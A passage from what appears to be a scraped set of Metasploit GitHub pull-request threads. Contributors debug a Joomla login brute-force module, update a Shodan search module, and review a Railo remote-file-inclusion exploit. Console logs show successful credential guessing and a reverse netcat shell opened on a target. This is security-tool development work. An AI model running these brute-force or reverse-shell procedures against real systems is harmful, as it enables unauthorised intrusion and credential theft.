       Try each user/password couple stored in the current database\r\n   DB_ALL_PASS       false                             no        Add all passwords in the current database to the list\r\n   DB_ALL_USERS      false                             no        Add all users in the current database to the list\r\n   FORM_URI          /joomla3/administrator            yes       The FORM URI to authenticate against\r\n   PASSWORD          admin                             no        A specific password to authenticate with\r\n   PASS_FILE                                           no        File containing passwords, one per line\r\n   PASS_VARIABLE     passwd                            yes       The name of the variable for the password field\r\n   Proxies                                             no        Use a proxy chain\r\n   RHOSTS            172.16.158.218                    yes       The target address range or CIDR identifier\r\n   RPORT             80                                yes       The target port\r\n   STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host\r\n   THREADS           1                                 yes       The number of concurrent threads\r\n   USERNAME          admin                             no        A specific username to authenticate as\r\n   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line\r\n   USER_AS_PASS      false                             no        Try the username as the password for all users\r\n   USER_FILE                                           no        File containing users, one per line\r\n   USER_VARIABLE     username                          yes       The name of the variable for the user field\r\n   VERBOSE           true                              yes       Whether to print output for all attempts\r\n   VHOST                                               no        HTTP server virtual host\r\n   WORD_ERROR        mod-login-username                yes       The word of message for detect that login fail\r\n\r\nmsf auxiliary(joomla_bruteforce_login) > set AUTH_URI /joomla25/administrator/index.php\r\nAUTH_URI => /joomla25/administrator/index.php\r\nmsf auxiliary(joomla_bruteforce_login) > set FORM_URI /joomla25/administrator\r\nFORM_URI => /joomla25/administrator\r\nmsf auxiliary(joomla_bruteforce_login) > run\r\n\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - Searching Joomla authentication URI...\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - /joomla25/administrator/index.php - Attempting to login...\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla25/administrator/index.php - Trying username:\'admin\' with password:\'admin\'\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla25/administrator/index.php - Searching Joomla Login Response...\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla25/administrator/index.php - Searching Joomla Login Form...\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla25/administrator/index.php - Testing Joomla 2.5 Form...\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla25/administrator/index.php - Searching Joomla Login Cookies...\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla25/administrator/index.php - Login with cookie ( c6ed372fa20abd294b912ecd6235b61f=eftmfjgu6hdmf129dvjsp7j8j7; ) and Hidden ( dba37573ce8adf0e72f8fd82166d9b57=1 )\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla25/administrator/index.php - Login Response 303\r\n[*] 172.16.158.218:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla25/administrator/index.php - Following redirect to http://172.16.158.218/joomla25/administrator/index.php...\r\n[+] http://172.16.158.218:80/joomla25/administrator/index.php - Successful login \'admin\' : \'admin\'\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(joomla_bruteforce_login) > creds\r\n\r\nCredentials\r\n===========\r\n\r\nhost            port  user   pass   type       proof                                                      active?\r\n----            ----  ----   ----   ----       -----                                                      -------\r\n172.16.158.218  80    admin  admin  passsword  http://172.16.158.218:80/joomla25/administrator/index.php  true\r\n172.16.158.219  80    admin  admin  passsword  http://172.16.158.219:80/joomla3/administrator/index.php   true\r\n```', 'Hi,\r\n\r\nI was testing your module, the option: STOP_ON_SUCCESS could be set on ""true"" or ""false"" but always stop when a credential works.\r\n\r\nit\'s not a big issue but STOP_ON_SUCCESS is always working as ""true""', 'Thanks @francesco1119 , I have filed a report to track this issue:\r\nhttps://github.com/rapid7/metasploit-framework/issues/5592', '@jvazquez-r7 You tested it on Joomla 3.3 while the module description only mention 2.5 and 3.0. I think the 3.3 target should be mentioned as well since 3.x is the dominant version now. ', ""@francesco1119 Can you check once again? Testing it again the STOP_ON_SUCCESS is behaving normally at my end. It is weird because I don't think someone has touched those parts of the lib that were causing the issue but that will be investigated next. First, please confirm if the issue is resolved for you. I have the latest git changes checking on master."", 'Unfortunately the issue is not resolved from me. Still stop when it find the password both with ""false"" and ""true""', '@francesco1119 Hmmm that is weird. Let me test some more.', ""Here is my output:\r\n\r\n```ruby\r\nmsf auxiliary(joomla_bruteforce_login) > show options\r\n\r\nModule options (auxiliary/scanner/http/joomla_bruteforce_login):\r\n\r\n   Name              Current Setting                                                             Required  Description\r\n   ----              ---------------                                                             --------  -----------\r\n   AUTH_URI          /joomla25/administrator/index.php                                           yes       The URI to authenticate against\r\n   BLANK_PASSWORDS   false                                                                       no        Try blank passwords for all users\r\n   BRUTEFORCE_SPEED  5                                                                           yes       How fast to bruteforce, from 0 to 5\r\n   DB_ALL_CREDS      false                                                                       no        Try each user/password couple stored in the current database\r\n   DB_ALL_PASS       false                                                                       no        Add all passwords in the current database to the list\r\n   DB_ALL_USERS      false                                                                       no        Add all users in the current database to the list\r\n   FORM_URI          /joomla25/administrator                                                     yes       The FORM URI to authenticate against\r\n   PASSWORD          password                                                                    no        A specific password to authenticate with\r\n   PASS_FILE         /root/joomla_pass.txt                                                       no        File containing passwords, one per line\r\n   PASS_VARIABLE     passwd                                                                      yes       The name of the variable for the password field\r\n   Proxies                                                                                       no        A proxy chain of format type:host:port[,type:host:port][...]\r\n   RHOSTS            XX.XX.XX.XX                                                                 yes       The target address range or CIDR identifier\r\n   RPORT             80                                                                          yes       The target port\r\n   STOP_ON_SUCCESS   true                                                                        yes       Stop guessing when a credential works for a host\r\n   THREADS           1                                                                           yes       The number of concurrent threads\r\n   USERNAME          admin                                                                       no        A specific username to authenticate as\r\n   USERPASS_FILE     /opt/void-in/metasploit-framework/data/wordlists/http_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line\r\n   USER_AS_PASS      false                                                                       no        Try the username as the password for all users\r\n   USER_FILE         /root/joomla_users.txt                                                      no        File containing users, one per line\r\n   USER_VARIABLE     username                                                                    yes       The name of the variable for the user field\r\n   VERBOSE           true                                                                        yes       Whether to print output for all attempts\r\n   VHOST                                                                                         no        HTTP server virtual host\r\n   WORD_ERROR        mod-login-username                                                          yes       The word of message for detect that login fail\r\n\r\nmsf auxiliary(joomla_bruteforce_login) > creds\r\nCredentials\r\n===========\r\n\r\nhost  service  public  private  realm  private_type\r\n----  -------  ------  -------  -----  ------------\r\n\r\nmsf auxiliary(joomla_bruteforce_login) > run\r\n\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - Searching Joomla authentication URI...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - /joomla25/administrator/index.php - Attempting to login...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Trying username:'admin' with password:'password'\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Searching Joomla Login Response...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Searching Joomla Login Form...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Testing Joomla 2.5 Form...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Searching Joomla Login Cookies...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Login with cookie\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Login Response 303\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Following redirect to http://XX.XX.XX.XX/joomla25/administrator/index.php...\r\n[+] http://XX.XX.XX.XX:80/joomla25/administrator/index.php - Successful login 'admin' : 'password'\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Trying username:'password' with password:'password'\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Searching Joomla Login Response...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Searching Joomla Login Form...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Testing Joomla 2.5 Form...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Searching Joomla Login Cookies...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Login with cookie\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Login Response 303\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Following redirect to http://XX.XX.XX.XX/joomla25/administrator/index.php...\r\n[-] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [002/110] - /joomla25/administrator/index.php - Failed to login as 'password'\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [003/110] - /joomla25/administrator/index.php - Trying username:'manager' with password:'password'\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [003/110] - /joomla25/administrator/index.php - Searching Joomla Login Response...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [003/110] - /joomla25/administrator/index.php - Searching Joomla Login Form...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [003/110] - /joomla25/administrator/index.php - Testing Joomla 2.5 Form...\r\n...snip\r\n\r\nCredentials\r\n===========\r\n\r\nhost         service        public  private   realm  private_type\r\n----         -------        ------  -------   -----  ------------\r\nXX.XX.XX.XX  80/tcp (http)  admin   password         Password\r\n\r\nmsf auxiliary(joomla_bruteforce_login) > set STOP_ON_SUCCESS true\r\nSTOP_ON_SUCCESS => true\r\nmsf auxiliary(joomla_bruteforce_login) > run\r\n\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - Searching Joomla authentication URI...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - /joomla25/administrator/index.php - Attempting to login...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Trying username:'admin' with password:'password'\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Searching Joomla Login Response...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Searching Joomla Login Form...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Testing Joomla 2.5 Form...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Searching Joomla Login Cookies...\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Login with cookie\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Login Response 303\r\n[*] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - /joomla25/administrator/index.php - Following redirect to http://XX.XX.XX.XX/joomla25/administrator/index.php...\r\n[+] http://XX.XX.XX.XX:80/joomla25/administrator/index.php - Successful login 'admin' : 'password'\r\n[-] XX.XX.XX.XX:80 JOOMLA_BRUTEFORCE - [001/110] - Bruteforce cancelled against this service.\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(joomla_bruteforce_login) >\r\n```\r\nIt is working fine. @wchen-r7 Did you check the Joomla brute force module STOP_ON_SUCCESS earlier?"", ""No, I've only read the source. And I'm not spotting the bug there.\r\n\r\nThe only plausible reason I can think of is for some reason when the Joomla login module is checking STOP_ON_SUCCESS, it's actually a String, not a TrueClass/FalseClass. That way it doesn't matter how you set it, the logic is always true anyway. However, it should never be a String, because the option should be normalized before use.\r\n\r\nIf I were him, I would do this before the ```return :abort``` statement in joomla_bruteforce_login and see what gets printed out:\r\n\r\n```ruby\r\n$stderr.puts datastore['STOP_ON_SUCCESS'].inspect\r\n```\r\n\r\nAnother possible reason I can think of is maybe his ~/.msf4/config is messing with him somehow? I don't really know for sure if that's possible, but worth checking."", ""I don't want to copy/paste the output here but if you want I can sent it to you in a private mail"", ""@wchen-r7 Yeah. That is actually a good advice. @francesco1119 Can you follow the suggestion? Just make sure datastore['STOP_ON_SUCCESS'] is actually a bool value when it is checked. Also, can you pull in the latest changes from git, then checkout this PR on top of it?"", ""> I don't want to copy/paste the output here but if you want I can sent it to you in a private mail\r\n\r\nIt's okay, you don't have to copy the whole output. The only thing that I'm curious most is the ```$stderr.puts``` line."", ""@void-in @francesco1119 I tested the module against the the latest Joomla, and I'm not really convinced there is a bug in the handling of STOP_ON_SUCCESS. When I set it to true, it stops right after a valid credential is found, which is expected. When I set it to false, it keeps going even a valid credential is found, which is also expected.\r\n\r\nI still suggest the same debugging steps [explained here](https://github.com/rapid7/metasploit-framework/pull/3532#issuecomment-115553415).\r\n\r\nIf you would like to e-mail the whole output, you can e-mail it to msfdev[at]metasploit.com. Please note that if we suspect you are trying against a live website without permission, we will not be allowed to assist you any further.\r\n\r\nThanks."", ""@francesco1119 Also, when you use the module, please make sure to do ```set VERBOSE true```. If you don't do that, the module won't print unsuccessful messages, which could make it feel like STOP_ON_SUCCESS is always true."", '@wchen-r7 Yup. Same as me. I am getting the expected behavior as well.', ""OK, the site is mine, thet's why I didn't wanted to copy/paste the ip address and other info. I will do that in the next hours.""]"
534,rapid7/metasploit-framework,3677.0,"Updated to support new API, domain, and HTTPS.

Shodan has recently added new domains, new API, and everything
is now over HTTPS. Optional DB reporting has been update so it
can be used as input to RHOSTS for other modules.","['The Travis fail seems unrelated.  It\'s friggin railtie\r\n```\r\nNoMethodError: undefined method `optionally_active_record_railtie\' for Metasploit::Framework::Require:Module\r\n/home/travis/build/rapid7/metasploit-framework/Rakefile:9:in `<top (required)>\'\r\n(See full trace by running task with --trace)\r\nThe command ""bundle exec rake db:create"" failed and exited with 1 during .\r\n```\r\n\r\nJohn, thanks very much for updating this module, sorry to saddle you with some of those comments that aren\'t related to your changes, but since you worked on the original too, I don\'t feel as bad ;)  Since you\'re already updating it, might as well clear out some of the cobwebs.', ""Thanks, guys. This feedback is great as I've also got two other new modules nearly completed and an update to an existing one. I'll work through these issues over the next few days and get things updated."", 'Travis should be green now. Had to restart it.', 'This last commit should address all the issues. The only one I ran into a problem was removing .nil?. It generated an error (TypeError no implicit conversion of nil into String) so I left it as is.', ""I've addressed all the comments from the last commit. There was a bug in the original code where it was not looping through and getting all the results properly. This has been fixed. I think that's it. Please let me know if there's anything else."", ""I haven't really tested the changes, but the code looks okay to me. If it runs okay then I vote let's merge it.\r\n\r\nI think I can probably use HttpClient instead of Net::HTTP to send HTTPS requests, but I don't really wanna delay this pull request any longer. I'll do that in a separate one later."", ""Found a bug:\r\n\r\n```\r\nmsf auxiliary(shodan_search) > run\r\n\r\n[-] Auxiliary failed: NoMethodError undefined method `%' for nil:NilClass\r\n[-] Call stack:\r\n[-]   /msf/modules/auxiliary/gather/shodan_search.rb:112:in `run'\r\n```\r\n\r\nLooks like the bug is new, because the current version from upstream master doesn't have this issue."", 'Can you provide more information so I can troubleshoot the bug?\r\n\r\nI have tested this module on OSX with MSF installed following the dev guide and on a fully updated Kali. This is what it looks like when I run it.\r\n\r\n```\r\nmsf auxiliary(shodan_search-git) > show options\r\n\r\nModule options (auxiliary/gather/shodan_search-git):\r\n\r\n   Name           Current Setting                   Required  Description\r\n   ----           ---------------                   --------  -----------\r\n   DATABASE       true                              no        Add search results to the database\r\n   MAXPAGE        1                                 yes       Max amount of pages to collect\r\n   OUTFILE        /tmp/a                            no        A filename to store the list of IPs\r\n   Proxies                                          no        Use a proxy chain\r\n   QUERY          rapid7.com                        yes       Keywords you want to search for\r\n   REGEX          .*                                yes       Regex search for a specific IP/City/Country/Hostname\r\n   SHODAN_APIKEY  <MY_KEY>                          yes       The SHODAN API key\r\n\r\nmsf auxiliary(shodan_search-git) > run\r\n\r\n[*] Total: 39 on 1 pages. Showing: 1 page(s)\r\n[*] Collecting data, please wait...\r\n\r\nSearch Results\r\n==============\r\n\r\n IP:Port             City       Country        Hostname\r\n -------             ----       -------        --------\r\n 198.143.173.162:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.163:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.165:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.166:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.168:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.170:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.172:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.173:23  Chicago    United States  \r\n 198.143.173.175:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.177:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.178:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.182:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.185:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.186:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.188:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.189:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 198.143.173.190:23  Chicago    United States  scanner1.labs.rapid7.com\r\n 208.118.227.12:25   Boston     United States  smtp002.rapid7.com\r\n 64.125.235.5:25     N/A        United States  64.125.235.5.available.above.net\r\n 71.6.216.34:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.35:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.37:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.38:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.39:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.41:23      San Diego  United States  \r\n 71.6.216.42:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.43:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.45:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.46:23      San Diego  United States  \r\n 71.6.216.47:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.49:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.51:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.53:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.56:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.57:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.59:23      San Diego  United States  \r\n 71.6.216.60:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.61:23      San Diego  United States  scanner2.labs.rapid7.com\r\n 71.6.216.62:23      San Diego  United States  scanner2.labs.rapid7.com\r\n\r\n[*] Saved results in /tmp/a\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(shodan_search-git) > \r\n```', ""Weird, it's working for me again.\r\n\r\nThis is what I remember about the error I hit: I remember it being the search engine returning nil (with a failure message, but I can't remember the content right now). And then when the module does ```results[page]['total']```, it's nil.\r\n\r\nSo basically there needs to another if condition checking what #shodan_query is returning, and it cannot assume there's always something in ```results[page]['total']```... I think I can improve that. I'll get that one and land the PR today.""]"
535,rapid7/metasploit-framework,3721.0,"This PR creates a new module that exploits dronesec's CVE-2014-5468 vulnerability detailed here: http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/

There are a few things in this module that are of concern however. For one, I need an image of a larger size in order to exploit this. I currently just call curl in order to get this image. It would be great if there was an image in the tree that I could simply read from the FS relatively from the module, as the curl I am doing is hella-hacky. Would love some feedback on how to do this properly.

Also need to add a check method, still. Wanted to get some initial critique. This is a relatively preliminary PR.


Quick run:

```
msf exploit(railo_cfml_rfi) > show options

Module options (exploit/linux/http/railo_cfml_rfi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        Use a proxy chain
   RHOST    172.31.16.19     yes       The target address
   RPORT    8888             yes       The target port
   SRVHOST  172.31.16.19     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.31.16.19     yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(railo_cfml_rfi) > exploit
[*] Exploit running as background job.

[*] Started reverse handler on 172.31.16.19:4444 
[*] Using URL: http://172.31.16.19:8080/nhgmBsPfiqHUfwr.cfm
[*] Using URL: http://172.31.16.19:8080/CkvIPPhUbWfNeuP
msf exploit(railo_cfml_rfi) >   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16013  100 16013    0     0  19409      0 --:--:-- --:--:-- --:--:-- 20192
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16013  100 16013    0     0  32956      0 --:--:-- --:--:-- --:--:-- 32948
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16013  100 16013    0     0  69944      0 --:--:-- --:--:-- --:--:-- 70232
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16013  100 16013    0     0  32189      0 --:--:-- --:--:-- --:--:-- 32546
[*] Waiting for first stage to download...
[*] Command shell session 2 opened (172.31.16.19:4444 -> 172.31.16.19:60187) at 2014-08-28 06:40:59 -0700
[*] Server stopped.

msf exploit(railo_cfml_rfi) > sessions -l

Active sessions
===============

  Id  Type        Information  Connection
  --  ----        -----------  ----------
  2   shell unix               172.31.16.19:4444 -> 172.31.16.19:60187 (172.31.16.19)

msf exploit(railo_cfml_rfi) > sessions -i 2
[*] Starting interaction with 2...

id
uid=1000(bperry) gid=1000(bperry) groups=1000(bperry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)

```
","['I also need to explicitly add TARGETURI to the options list. I have been setting it by hand to /railo-context/', 'I think I addressed everything but the check method.\r\n\r\nThe png is a tiny 1x1 image, drone clarified with me on the image restrictions.\r\n\r\n```\r\nmsf exploit(railo_cfml_rfi) > show options\r\n\r\nModule options (exploit/linux/http/railo_cfml_rfi):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   Proxies                     no        Use a proxy chain\r\n   RHOST      192.168.1.32     yes       The target address\r\n   RPORT      8888             yes       The target port\r\n   SRVHOST    192.168.1.31     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\r\n   SRVPORT    8080             yes       The local port to listen on.\r\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\r\n   STAGEWAIT  10               yes       Number of seconds to wait for stager to download\r\n   TARGETURI  /railo-context/  yes       The base URI of the Railo server\r\n   URIPATH                     no        The URI to use for this exploit (default is random)\r\n   VHOST                       no        HTTP server virtual host\r\n\r\n\r\nPayload options (cmd/unix/reverse_netcat):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST  192.168.1.31     yes       The listen address\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic\r\n\r\n\r\nmsf exploit(railo_cfml_rfi) > exploit\r\n[*] Exploit running as background job.\r\n\r\n[*] Started reverse handler on 192.168.1.31:4444 \r\n[*] Using URL: http://192.168.1.31:8080/MPcNwNyqSkLVCys.cfm\r\n[*] Using URL: http://192.168.1.31:8080/JLjUmmLCEwzgFjK\r\nmsf exploit(railo_cfml_rfi) > [*] Sending stage. This might be sent multiple times.\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Waiting for first stage to download...\r\n[*] Executing stager\r\n[*] Sending payload\r\n[*] Command shell session 2 opened (192.168.1.31:4444 -> 192.168.1.32:36775) at 2014-08-29 17:31:16 -0500\r\n\r\nmsf exploit(railo_cfml_rfi) > sessions -i 2\r\n[*] Starting interaction with 2...\r\n\r\nid\r\nuid=1000(bperry) gid=1000(bperry) groups=4(adm),20(dialout),24(cdrom),46(plugdev),107(lpadmin),108(sambashare),109(admin),1000(bperry)\r\n\r\n```', 'I am not sure check will be super accurate. I know the major and minor build (4.2), but not the micro (1). What should a check return if you can say it MIGHT be vulnerable?', ""Also, I have a copy of the vuln version if they have patched the version available to download.\r\n\r\n(Edit: I don't think that they have uploaded a patched version yet)"", 'I don\'t know how useful a ""maybe"" would be, because it\'s not terribly actionable. However, you should be able to get away with `Appears` - banners and versions are already assumed to be somewhat unreliable.\n\nhttps://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-check()-method\n-- \nSent from a tiny computer.\nPGP KeyId: 4096R/F577904A\nhttps://gist.github.com/todb-r7/84ae2e08eb4dafbc4822\nText (insecure): 512-438-9165', 'I think it is ready for a final review! Check method added', ""Minus my last bits of feedback (which I can get to if you can't), the only thing that I think needs to be fixed to land this is the check method -- ```admin42.css.cfm``` doesn't exist in < 4.2.  I poked around and it looks like you could instead use ```res/images/id.png``` which exists in 4.1+ and has a consistent md5sum of ```6de48cb72421cfabdce440077a921b25```.\r\n\r\nOther than that, this looks good.  I've tested against 4.2.1 (vulnerable), 4.1.2 (vulnerable) and 4.0.4 (invulnerable)\r\n"", ""Yeah, I only tested against 4.2.\r\n\r\nCan you shoot me a link to the 4.1.2 installer, I can install it and test\r\nit as well.\r\n\r\nOn Tue, Sep 9, 2014 at 3:01 PM, Jon Hart <notifications@github.com> wrote:\r\n\r\n> Minus my last bits of feedback (which I can get to if you can't), the only\r\n> thing that I think needs to be fixed to land this is the check method --\r\n> admin42.css.cfm doesn't exist in < 4.2. I poked around and it looks like\r\n> you could instead use res/images/id.png which exists in 4.1+ and has a\r\n> consistent md5sum of 6de48cb72421cfabdce440077a921b25.\r\n>\r\n> Other than that, this looks good. I've tested against 4.2.1 (vulnerable),\r\n> 4.1.2 (vulnerable) and 4.0.4 (invulnerable)\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/rapid7/metasploit-framework/pull/3721#issuecomment-55024677>\r\n> .\r\n>\r\n\r\n\r\n\r\n-- \r\nhttp://volatile-minds.blogspot.com -- blog\r\nhttp://www.volatileminds.net -- website"", 'http://www.getrailo.org/index.cfm/download/olderversions/ has the older versions. ', ""Perfect, I will get this done, but it likely won't be until later this week\r\n(thursdayish probably at the earliest).\r\n\r\n\r\nOn Tue, Sep 9, 2014 at 3:08 PM, Jon Hart <notifications@github.com> wrote:\r\n\r\n> http://www.getrailo.org/index.cfm/download/olderversions/ has the older\r\n> versions.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/rapid7/metasploit-framework/pull/3721#issuecomment-55025617>\r\n> .\r\n>\r\n\r\n\r\n\r\n-- \r\nhttp://volatile-minds.blogspot.com -- blog\r\nhttp://www.volatileminds.net -- website"", 'FWIW:\r\n\r\n```\r\nroot@unknown000C29B25337:~# find . -type f | xargs md5sum  | grep 6de48cb72421cfabdce440077a921b25\r\n6de48cb72421cfabdce440077a921b25  ./railo-express-4.1.2.005-nojre/webapps/www/res/images/id.png\r\n6de48cb72421cfabdce440077a921b25  ./railo-express-4.1.0.011-nojre/webapps/www/res/images/id.png\r\n6de48cb72421cfabdce440077a921b25  ./railo-express-4.1.0.004-nojre/webapps/www/res/images/id.png\r\n6de48cb72421cfabdce440077a921b25  ./railo-express-4.1.1.009-nojre/webapps/www/res/images/id.png\r\n6de48cb72421cfabdce440077a921b25  ./railo-express-4.1.1.000-nojre/webapps/www/res/images/id.png\r\n6de48cb72421cfabdce440077a921b25  ./railo-express-4.2.1.000-nojre/webapps/ROOT/res/images/id.png\r\n```', 'Done! Found a small bit if free time :)', ""Landed after minor style and usability changes.  Looks good!  Thanks!\r\n\r\nHere was my testing:\r\n\r\nI have 3 hosts 4.2.1, 4.1.2 and 4.0.4, all listening on 8888/TCP running as root.  These hosts cannot make outbound connections back to me so I need to use a ```PAYLOAD``` that binds and, similarly, ```SRVHOST``` needs to be set to the target's loopback which has ssh tunnels setup to get the HTTP requests for stager/etc back to me:\r\n\r\n```\r\n[*] Processing /tmp/railo.rc for ERB directives.\r\nresource (/tmp/railo.rc)> use exploit/linux/http/railo_cfml_rfi\r\nresource (/tmp/railo.rc)> set PAYLOAD cmd/unix/bind_netcat\r\nPAYLOAD => cmd/unix/bind_netcat\r\nresource (/tmp/railo.rc)> set RPORT 8888\r\nRPORT => 8888\r\nresource (/tmp/railo.rc)> set SRVHOST 127.0.0.1\r\nSRVHOST => 